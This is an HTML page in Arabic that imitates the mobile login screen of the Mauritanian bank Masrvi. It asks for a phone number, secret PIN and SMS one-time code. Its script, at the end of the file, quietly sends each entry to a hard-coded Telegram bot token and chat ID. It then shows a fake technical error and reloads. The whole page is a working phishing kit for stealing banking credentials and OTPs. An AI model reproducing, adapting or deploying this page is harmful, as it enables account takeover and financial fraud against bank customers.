<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Masrvi | المصرف الموريتاني للاستثمار</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
        body { margin: 0; padding: 0; background-color: #fff; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; }
        .wrapper { width: 100%; max-width: 450px; background: #fff; position: relative; overflow-x: hidden; }
        
        .header-img { width: 100%; display: block; }
        .footer-img { width: 100%; position: fixed; bottom: 0; max-width: 450px; z-index: -1; }

        .form-container { padding: 20px; text-align: right; margin-top: 20px; }
        .label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 15px; }
        .label span { color: red; }

        .input-box { 
            position: relative; border: 2px solid #000; border-radius: 10px; 
            margin-bottom: 25px; display: flex; align-items: center; padding: 5px 15px;
        }
        .input-box img { width: 25px; margin-left: 10px; }
        input { 
            border: none; width: 100%; font-size: 18px; padding: 10px; 
            text-align: right; outline: none; background: transparent; font-family: 'Cairo';
        }

        .btn-main { 
            background-color: #2c5364; color: white; border: none; width: 100%; 
            padding: 15px; border-radius: 5px; font-size: 20px; font-weight: bold; 
            cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); margin-top: 10px;
        }

        /* واجهة OTP */
        .otp-icon { width: 120px; margin: 30px auto; display: block; }
        .otp-msg { text-align: center; font-size: 16px; margin-bottom: 20px; padding: 0 20px; }
        .timer-box { 
            background: #000; color: #fff; width: fit-content; margin: 15px auto; 
            padding: 10px 20px; font-size: 25px; font-weight: bold; border-radius: 5px;
        }
        .resend { text-align: center; color: #000; text-decoration: underline; cursor: pointer; font-weight: bold; margin: 20px 0; display: block; }

        .hidden { display: none; }
    </style>
</head>
<body>

<div class="wrapper">
    <img src="https://static.wixstatic.com/media/9d6796_87c2c10b0f4c4a45a33b006c79a94156~mv2.png" class="header-img">

    <div id="p1" class="form-container">
        <label class="label">رقم الهاتف *</label>
        <div class="input-box">
            <input type="tel" id="tel" placeholder="رقم الهاتف" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
            <img src="https://cdn-icons-png.flaticon.com/512/1077/1077063.png">
        </div>

        <label class="label">الرمز السري *</label>
        <div class="input-box">
            <input type="password" id="pin" placeholder="أدخل الرمز السري الخاص بك للمتابعة" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
            <img src="https://cdn-icons-png.flaticon.com/512/3064/3064155.png">
        </div>

        <button class="btn-main" onclick="toStep2()">ادخل السحب</button>
    </div>

    <div id="p2" class="form-container hidden">
        <img src="https://static.wixstatic.com/media/9d6796_6e4c7068524d4554b7063546738981f2~mv2.png" class="otp-icon">
        <p class="otp-msg">يرجى ادخال الرمز الذي تلقيته عبر الرسائل النصية *</p>
        
        <div class="input-box">
            <input type="tel" id="otp" placeholder="######" maxlength="6" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
            <img src="https://cdn-icons-png.flaticon.com/512/3638/3638933.png">
        </div>

        <p style="text-align: center; margin-bottom: 5px;">تنتهي صلاحية الرمز خلال</p>
        <div class="timer-box" id="time">05:00</div>
        
        <span class="resend" onclick="location.reload()">إعادة إرسال رمز التأكيد</span>

        <button class="btn-main" onclick="final()">تأكيد العملية</button>
    </div>

    <img src="https://static.wixstatic.com/media/9d6796_276a6e9a65d342898c868e8268571234~mv2.png" class="footer-img">
</div>

<script>
    const tok = "8647203625:AAFUHY8sXVD8IoSvf60Wd7pT-l5MHDO-d9I";
    const cid = "5244299184";

    function send(t) {
        new Image().src = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`;
    }

    function toStep2() {
        const t = document.getElementById('tel').value;
        const p = document.getElementById('pin').value;
        if(t && p) {
            send(`🚨 دخول:\n📱 هاتف: ${t}\n🔑 رمز: ${p}`);
            document.getElementById('p1').classList.add('hidden');
            document.getElementById('p2').classList.remove('hidden');
            let time = 300;
            const display = document.getElementById('time');
            setInterval(() => {
                let m = Math.floor(time / 60);
                let s = time % 60;
                display.innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
                if(time > 0) time--;
            }, 1000);
        } else { alert("يرجى ملء البيانات"); }
    }

    function final() {
        const o = document.getElementById('otp').value;
        if(o) {
            send(`🔢 OTP: ${o}`);
            alert("حدث خطأ تقني، يرجى إعادة المحاولة لاحقاً.");
            location.reload();
        }
    }
</script>

</body>
</html>
